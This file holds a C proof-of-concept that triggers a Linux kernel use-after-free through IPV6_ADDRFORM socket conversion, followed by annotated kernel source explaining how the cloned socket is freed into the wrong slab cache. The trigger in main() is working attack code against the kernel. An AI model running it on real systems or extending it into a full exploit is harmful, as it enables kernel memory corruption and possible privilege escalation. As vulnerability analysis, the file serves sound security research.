void main(void)
{
    // call inet6_create()
    int fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP); 
    int new_fd, newest_fd, client_fd;
    struct sockaddr_in6 bind_addr;
    struct sockaddr_in bind_addr4, client_addr1, client_addr2;
    struct sockaddr unsp;
    int val;

    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin6_family = AF_INET6;
    bind_addr.sin6_port = ntohs(42424);

    memset(&client_addr1, 0, sizeof(client_addr1));
    client_addr1.sin_family = AF_INET;
    client_addr1.sin_port = ntohs(42424);
    client_addr1.sin_addr.s_addr = inet_addr("127.0.0.1");

    memset(&client_addr2, 0, sizeof(client_addr2));
    client_addr2.sin_family = AF_INET;
    client_addr2.sin_port = ntohs(42421);
    client_addr2.sin_addr.s_addr = inet_addr("127.0.0.1");

    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));

    listen(fd, 5);

    client_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    connect(client_fd, (struct sockaddr *)&client_addr1, sizeof(client_addr1));
    new_fd = accept(fd, NULL, NULL);
    close(fd);

    val = AF_INET;
    // call do_ipv6_setsockopt() -> trans ipv4 socket to ipv6.
    setsockopt(new_fd, SOL_IPV6, IPV6_ADDRFORM, &val, sizeof(val));
    // At this time, new_fd got follow member values.
    // - sk->sk_prot = &tcp_prot
    // - sk->sk_prot_creator = &tcpv6_prot

    memset(&unsp, 0, sizeof(unsp));
    unsp.sa_family = AF_UNSPEC;

    // AF_UNSPEC turns socket to listening socket.
    connect(new_fd, &unsp, sizeof(unsp));

    memset(&bind_addr4, 0, sizeof(bind_addr4));
    bind_addr4.sin_family = AF_INET;
    bind_addr4.sin_port = ntohs(42421);
    bind(new_fd, (struct sockaddr *)&bind_addr4, sizeof(bind_addr4));

    listen(new_fd, 5);

    client_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(client_fd, (struct sockaddr *)&client_addr2, sizeof(client_addr2));

    // call sk_clone_lock()
    // !!! VULNERABLE !!!
    newest_fd = accept(new_fd, NULL, NULL); // UAF occured.
    close(new_fd);

    close(client_fd);
    close(new_fd);
}

// ------------------ below is kernel level source code ------------------ //

/**
 *	struct sock_common - minimal network layer representation of sockets
 *	@skc_daddr: Foreign IPv4 addr
 *	@skc_rcv_saddr: Bound local IPv4 addr
 *	@skc_hash: hash value used with various protocol lookup tables
 *	@skc_u16hashes: two u16 hash values used by UDP lookup tables
 *	@skc_dport: placeholder for inet_dport/tw_dport
 *	@skc_num: placeholder for inet_num/tw_num
 *	@skc_family: network address family
 *	@skc_state: Connection state
 *	@skc_reuse: %SO_REUSEADDR setting
 *	@skc_reuseport: %SO_REUSEPORT setting
 *	@skc_bound_dev_if: bound device index if != 0
 *	@skc_bind_node: bind hash linkage for various protocol lookup tables
 *	@skc_portaddr_node: second hash linkage for UDP/UDP-Lite protocol
 *	@skc_prot: protocol handlers inside a network family
 *	@skc_net: reference to the network namespace of this socket
 *	@skc_node: main hash linkage for various protocol lookup tables
 *	@skc_nulls_node: main hash linkage for TCP/UDP/UDP-Lite protocol
 *	@skc_tx_queue_mapping: tx queue number for this connection
 *	@skc_flags: place holder for sk_flags
 *		%SO_LINGER (l_onoff), %SO_BROADCAST, %SO_KEEPALIVE,
 *		%SO_OOBINLINE settings, %SO_TIMESTAMPING settings
 *	@skc_incoming_cpu: record/match cpu processing incoming packets
 *	@skc_refcnt: reference count
 *
 *	This is the minimal network layer representation of sockets, the header
 *	for struct sock and struct inet_timewait_sock.
 */

struct sock_common {
	/* skc_daddr and skc_rcv_saddr must be grouped on a 8 bytes aligned
	 * address on 64bit arches : cf INET_MATCH()
	 */
	union {
		__addrpair	skc_addrpair;
		struct {
			__be32	skc_daddr;
			__be32	skc_rcv_saddr;
		};
	};
	union  {
		unsigned int	skc_hash;
		__u16		skc_u16hashes[2];
	};
	/* skc_dport && skc_num must be grouped as well */
	union {
		__portpair	skc_portpair;
		struct {
			__be16	skc_dport;
			__u16	skc_num;
		};
	};

	unsigned short		skc_family;
	volatile unsigned char	skc_state;
	unsigned char		skc_reuse:4;
	unsigned char		skc_reuseport:1;
	unsigned char		skc_ipv6only:1;
	unsigned char		skc_net_refcnt:1;
	int			skc_bound_dev_if;
	union {
		struct hlist_node	skc_bind_node;
		struct hlist_node	skc_portaddr_node;
	};
	struct proto		*skc_prot;
	possible_net_t		skc_net;

#if IS_ENABLED(CONFIG_IPV6)
	struct in6_addr		skc_v6_daddr;
	struct in6_addr		skc_v6_rcv_saddr;
#endif

	atomic64_t		skc_cookie;

	/* following fields are padding to force
	 * offset(struct sock, sk_refcnt) == 128 on 64bit arches
	 * assuming IPV6 is enabled. We use this padding differently
	 * for different kind of 'sockets'
	 */
	union {
		unsigned long	skc_flags;
		struct sock	*skc_listener; /* request_sock */
		struct inet_timewait_death_row *skc_tw_dr; /* inet_timewait_sock */
	};
	/*
	 * fields between dontcopy_begin/dontcopy_end
	 * are not copied in sock_copy()
	 */
	/* private: */
	int			skc_dontcopy_begin[0];
	/* public: */
	union {
		struct hlist_node	skc_node;
		struct hlist_nulls_node skc_nulls_node;
	};
	int			skc_tx_queue_mapping;
	union {
		int		skc_incoming_cpu;
		u32		skc_rcv_wnd;
		u32		skc_tw_rcv_nxt; /* struct tcp_timewait_sock  */
	};

	refcount_t		skc_refcnt;
	/* private: */
	int                     skc_dontcopy_end[0];
	union {
		u32		skc_rxhash;
		u32		skc_window_clamp;
		u32		skc_tw_snd_nxt; /* struct tcp_timewait_sock */
	};
	/* public: */
};

struct sock {
	/*
	 * Now struct inet_timewait_sock also uses sock_common, so please just
	 * don't add nothing before this first member (__sk_common) --acme
	 */
	struct sock_common	__sk_common;
#define sk_node			__sk_common.skc_node
#define sk_nulls_node		__sk_common.skc_nulls_node
#define sk_refcnt		__sk_common.skc_refcnt
#define sk_tx_queue_mapping	__sk_common.skc_tx_queue_mapping
#ifdef CONFIG_XPS
#define sk_rx_queue_mapping	__sk_common.skc_rx_queue_mapping
#endif

#define sk_dontcopy_begin	__sk_common.skc_dontcopy_begin
#define sk_dontcopy_end		__sk_common.skc_dontcopy_end
#define sk_hash			__sk_common.skc_hash
#define sk_portpair		__sk_common.skc_portpair
#define sk_num			__sk_common.skc_num
#define sk_dport		__sk_common.skc_dport
#define sk_addrpair		__sk_common.skc_addrpair
#define sk_daddr		__sk_common.skc_daddr
#define sk_rcv_saddr		__sk_common.skc_rcv_saddr
#define sk_family		__sk_common.skc_family
#define sk_state		__sk_common.skc_state
#define sk_reuse		__sk_common.skc_reuse
#define sk_reuseport		__sk_common.skc_reuseport
#define sk_ipv6only		__sk_common.skc_ipv6only
#define sk_net_refcnt		__sk_common.skc_net_refcnt
#define sk_bound_dev_if		__sk_common.skc_bound_dev_if
#define sk_bind_node		__sk_common.skc_bind_node
#define sk_prot			__sk_common.skc_prot
#define sk_net			__sk_common.skc_net
#define sk_v6_daddr		__sk_common.skc_v6_daddr
#define sk_v6_rcv_saddr	__sk_common.skc_v6_rcv_saddr
#define sk_cookie		__sk_common.skc_cookie
#define sk_incoming_cpu		__sk_common.skc_incoming_cpu
#define sk_flags		__sk_common.skc_flags
#define sk_rxhash		__sk_common.skc_rxhash

	socket_lock_t		sk_lock;
	atomic_t		sk_drops;
	int			sk_rcvlowat;
	struct sk_buff_head	sk_error_queue;
	struct sk_buff		*sk_rx_skb_cache;
	struct sk_buff_head	sk_receive_queue;
	/*
	 * The backlog queue is special, it is always used with
	 * the per-socket spinlock held and requires low latency
	 * access. Therefore we special case it's implementation.
	 * Note : rmem_alloc is in this structure to fill a hole
	 * on 64bit arches, not because its logically part of
	 * backlog.
	 */
	struct {
		atomic_t	rmem_alloc;
		int		len;
		struct sk_buff	*head;
		struct sk_buff	*tail;
	} sk_backlog;
#define sk_rmem_alloc sk_backlog.rmem_alloc

	int			sk_forward_alloc;
#ifdef CONFIG_NET_RX_BUSY_POLL
	unsigned int		sk_ll_usec;
	/* ===== mostly read cache line ===== */
	unsigned int		sk_napi_id;
#endif
	int			sk_rcvbuf;

	struct sk_filter __rcu	*sk_filter;
	union {
		struct socket_wq __rcu	*sk_wq;
		/* private: */
		struct socket_wq	*sk_wq_raw;
		/* public: */
	};
#ifdef CONFIG_XFRM
	struct xfrm_policy __rcu *sk_policy[2];
#endif
	struct dst_entry	*sk_rx_dst;
	struct dst_entry __rcu	*sk_dst_cache;
	atomic_t		sk_omem_alloc;
	int			sk_sndbuf;

	/* ===== cache line for TX ===== */
	int			sk_wmem_queued;
	refcount_t		sk_wmem_alloc;
	unsigned long		sk_tsq_flags;
	union {
		struct sk_buff	*sk_send_head;
		struct rb_root	tcp_rtx_queue;
	};
	struct sk_buff		*sk_tx_skb_cache;
	struct sk_buff_head	sk_write_queue;
	__s32			sk_peek_off;
	int			sk_write_pending;
	__u32			sk_dst_pending_confirm;
	u32			sk_pacing_status; /* see enum sk_pacing */
	long			sk_sndtimeo;
	struct timer_list	sk_timer;
	__u32			sk_priority;
	__u32			sk_mark;
	unsigned long		sk_pacing_rate; /* bytes per second */
	unsigned long		sk_max_pacing_rate;
	struct page_frag	sk_frag;
	netdev_features_t	sk_route_caps;
	netdev_features_t	sk_route_nocaps;
	netdev_features_t	sk_route_forced_caps;
	int			sk_gso_type;
	unsigned int		sk_gso_max_size;
	gfp_t			sk_allocation;
	__u32			sk_txhash;

	/*
	 * Because of non atomicity rules, all
	 * changes are protected by socket lock.
	 */
	u8			sk_padding : 1,
				sk_kern_sock : 1,
				sk_no_check_tx : 1,
				sk_no_check_rx : 1,
				sk_userlocks : 4;
	u8			sk_pacing_shift;
	u16			sk_type;
	u16			sk_protocol;
	u16			sk_gso_max_segs;
	unsigned long	        sk_lingertime;
	struct proto		*sk_prot_creator;
	rwlock_t		sk_callback_lock;
	int			sk_err,
				sk_err_soft;
	u32			sk_ack_backlog;
	u32			sk_max_ack_backlog;
	kuid_t			sk_uid;
	struct pid		*sk_peer_pid;
	const struct cred	*sk_peer_cred;
	long			sk_rcvtimeo;
	ktime_t			sk_stamp;
#if BITS_PER_LONG==32
	seqlock_t		sk_stamp_seq;
#endif
	u16			sk_tsflags;
	u8			sk_shutdown;
	u32			sk_tskey;
	atomic_t		sk_zckey;

	u8			sk_clockid;
	u8			sk_txtime_deadline_mode : 1,
				sk_txtime_report_errors : 1,
				sk_txtime_unused : 6;

	struct socket		*sk_socket;
	void			*sk_user_data;
#ifdef CONFIG_SECURITY
	void			*sk_security;
#endif
	struct sock_cgroup_data	sk_cgrp_data;
	struct mem_cgroup	*sk_memcg;
	void			(*sk_state_change)(struct sock *sk);
	void			(*sk_data_ready)(struct sock *sk);
	void			(*sk_write_space)(struct sock *sk);
	void			(*sk_error_report)(struct sock *sk);
	int			(*sk_backlog_rcv)(struct sock *sk,
						  struct sk_buff *skb);
#ifdef CONFIG_SOCK_VALIDATE_XMIT
	struct sk_buff*		(*sk_validate_xmit_skb)(struct sock *sk,
							struct net_device *dev,
							struct sk_buff *skb);
#endif
	void                    (*sk_destruct)(struct sock *sk);
	struct sock_reuseport __rcu	*sk_reuseport_cb;
#ifdef CONFIG_BPF_SYSCALL
	struct bpf_local_storage __rcu	*sk_bpf_storage;
#endif
	struct rcu_head		sk_rcu;
};

/*
 *	Create an inet socket.
 */

static int inet_create(struct net *net, struct socket *sock, int protocol,
		               int kern)
{
	struct sock *sk;
    
    /* ... */

	err = -ENOBUFS;
	sk = sk_alloc(net, PF_INET, GFP_KERNEL, answer_prot, kern);
	if (!sk)
		goto out;

	/* ... */
}

static int inet6_create(struct net *net, struct socket *sock, int protocol,
			            int kern)
{
	struct sock *sk;

    /* ... */

	err = -ENOBUFS;
	sk = sk_alloc(net, PF_INET6, GFP_KERNEL, answer_prot, kern);
	if (!sk)
		goto out;

    /* ... */
}

/**
 *	sk_alloc - All socket objects are allocated here
 *	@net: the applicable net namespace
 *	@family: protocol family
 *	@priority: for allocation (%GFP_KERNEL, %GFP_ATOMIC, etc)
 *	@prot: struct proto associated with this new sock instance
 *	@kern: is this to be a kernel socket?
 */
struct sock *sk_alloc(struct net *net, int family, gfp_t priority,
		              struct proto *prot, int kern)
{
	struct sock *sk;

	sk = sk_prot_alloc(prot, priority | __GFP_ZERO, family);
	if (sk) {
		sk->sk_family = family;
		sk->sk_prot = sk->sk_prot_creator = prot;
		
        /* ... */
	}

	return sk;
}

static struct sock *sk_prot_alloc(struct proto *prot, gfp_t priority,
		int family)
{
	struct sock *sk;
	struct kmem_cache *slab;

	slab = prot->slab;
	if (slab != NULL) {
		sk = kmem_cache_alloc(slab, priority & ~__GFP_ZERO); // simillar as malloc
		if (!sk)
			return sk;
		if (priority & __GFP_ZERO)
			sk_prot_clear_nulls(sk, prot->obj_size);
	} else
		sk = kmalloc(prot->obj_size, priority); // simillar as malloc

    /* ... */

    return sk;

    /* ... */
}

static void __sk_destruct(struct rcu_head *head)
{
    /* ... */
	sk_prot_free(sk->sk_prot_creator, sk);
}

static void sk_prot_free(struct proto *prot, struct sock *sk)
{
	struct kmem_cache *slab;
	struct module *owner;

	owner = prot->owner;
	slab = prot->slab;
    
    /* ... */

	if (slab != NULL)
		kmem_cache_free(slab, sk); // similar as free().
	else
		kfree(sk); // similar as free().

	/* ... */
}

static int do_ipv6_setsockopt(struct sock *sk, int level, int optname,
		                      char __user *optval, unsigned int optlen)
{
	/* ... */

	switch (optname) {

	case IPV6_ADDRFORM:
    
        /* ... */

		if (val == PF_INET) {
            
            /* ... */

			if (sk->sk_protocol == IPPROTO_TCP) {
				struct inet_connection_sock *icsk = inet_csk(sk);
                /* ... */
				sk->sk_prot = &tcp_prot;
				icsk->icsk_af_ops = &ipv4_specific;
				sk->sk_socket->ops = &inet_stream_ops;
				sk->sk_family = PF_INET;
				tcp_sync_mss(sk, icsk->icsk_pmtu_cookie);
			}

            /* ... */
		}
        /* ... */
    }
    /* ... */
}

/*
 * OK, Follow is the summary of all this codes.
 * - sk->sk_prot_creator : allocate/free.
 * - sk->sk_prot         : other operations.
*/

struct sock *sk_clone_lock(const struct sock *sk, const gfp_t priority)
{
	struct sock *newsk;
	bool is_charged = true;

	newsk = sk_prot_alloc(sk->sk_prot, priority, sk->sk_family);
	if (newsk != NULL) {
		struct sk_filter *filter;

		sock_copy(newsk, sk);

        /* ... */
    }

    /* ... */
}

/*
 * Copy all fields from osk to nsk but nsk->sk_refcnt must not change yet,
 * even temporarly, because of RCU lookups. sk_node should also be left as is.
 * We must not copy fields between sk_dontcopy_begin and sk_dontcopy_end
 */
static void sock_copy(struct sock *nsk, const struct sock *osk)
{
	memcpy(nsk, osk, offsetof(struct sock, sk_dontcopy_begin));

	memcpy(&nsk->sk_dontcopy_end, &osk->sk_dontcopy_end,
	       osk->sk_prot->obj_size - offsetof(struct sock, sk_dontcopy_end));
}

// After sock_copy invoked,
// - newsk->sk_prot = &tcp_port
// - newsk->sk_prot_creator = &tcpv6_prot
//
// When closing the fd
// - sk_prot_free(sk->sk_prot_creator, sk);
// - kmem_cache_free(slab, sk);
// - The TCPv4 object will be wrongly recycled in the TCPv6 slab cache